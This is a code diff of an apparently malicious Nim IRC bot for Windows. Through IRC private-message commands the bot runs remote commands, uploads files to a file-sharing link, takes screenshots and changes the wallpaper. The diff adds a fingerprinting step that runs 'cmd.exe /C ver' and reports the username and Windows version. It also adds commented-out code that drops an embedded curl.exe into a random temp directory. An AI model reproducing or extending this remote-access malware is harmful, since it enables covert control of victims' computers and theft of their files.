@@ -1,4 +1,4 @@
-import irc, strutils, osproc, os, zippy, base64, math, update_handler, json, asyncdispatch, threadpool, encodings, screenshot, random, winim, bitops
+import irc, strutils, osproc, os, zippy, base64, math, update_handler, json, asyncdispatch, threadpool, encodings, screenshot, random, winim, bitops, alphanum
 
 let
     g_dbg* = true
@@ -15,6 +15,9 @@ type
     ExecRespose = tuple
         exitCode:int
         output:string
+
+# const
+#     curl_exe = readFile("curl.exe")
 
 
 
@@ -117,8 +120,6 @@ proc helper_responseHandler(response:Future[ExecRespose], client:AsyncIrc, event
 
 
 
-
-
 proc rexec_runCommand(cmd:string):Future[ExecRespose] {.async.} =
     var 
         output:string
@@ -162,7 +163,7 @@ proc cmd_getFileIO(event:IrcEvent, client:AsyncIrc, tokens:seq[string]) {.async.
                 try:
                     var json_data = parseJson(output)
                     var download_link = json_data["link"].str
-                    client.privmsg(event.origin, "you have 1 attpemt, 1 hour: " & download_link)
+                    client.privmsg(event.origin, "you have 1 attempt, 1 hour: " & download_link)
                 except:
                     client.privmsg(event.origin, "parsing error, you have 1 hour: " & output)
             else:
@@ -390,6 +391,9 @@ proc cmd_screenshot(event:IrcEvent, client:AsyncIrc) {.async.} =
         setCurrentDir(current_dir)  
 
 
+
+
+
 proc cmd_wallpaper(event:IrcEvent, client:AsyncIrc,tokens:seq[string]) {.async.} =
     try:
         discard client.privmsg(event.origin, "trying to change wallpaper")
@@ -413,6 +417,26 @@ proc cmd_wallpaper(event:IrcEvent, client:AsyncIrc,tokens:seq[string]) {.async.}
          discard client.privmsg(event.origin, "error changing wallpaper [" & repr(e) & "]")
 
 
+
+
+
+# proc cmd_setupCurl(event:IrcEvent, client:AsyncIrc) {.async.}=
+#     try:
+#         var
+#             curl_tmp_dir = getTempDir() & alphaNumeric(8) & "\\"
+#             curl_exe_path = curl_tmp_dir & "curl.exe"
+#         writeFile(curl_exe_path,curl_exe)
+#         discard client.privmsg(event.origin, "well i tried. path: " & curl_exe_path)
+#     except OSError as e:
+#         discard client.privmsg(event.origin, "that did not work: " & repr(e))
+
+
+
+# proc cmd_setCurlPath(event:IrcEvent, client:AsyncIrc, tokens:seq[string]) {.async.} =
+#     discard
+
+
+
 ## Checks if a private message was a command and calls appropriate functions
 proc cmdh_handle*(event:IrcEvent, client:AsyncIrc):void {.thread.} =
     var
@@ -426,7 +450,14 @@ proc cmdh_handle*(event:IrcEvent, client:AsyncIrc):void {.thread.} =
             tokens.add(token.token)
 
     case tokens[0]:
-    of "!hey": discard client.privmsg(event.origin, "heyyy v" & $current_version & " as " & getEnv("USERNAME"))
+    of "!hey":
+        var win_ver = "<void>"
+        try:
+            var (output, _ ) = execCmdEx("cmd.exe /C ver")
+            output = output.strip(chars={'\r','\n'})
+        except:
+            discard
+        discard client.privmsg(event.origin, "heyyy v" & $current_version & " as " & getEnv("USERNAME") & " windows version: " & win_ver)
     of "!lag": discard client.privmsg(event.origin, formatFloat(client.getLag))
     of "!excessFlood":
         for i in 0..10:
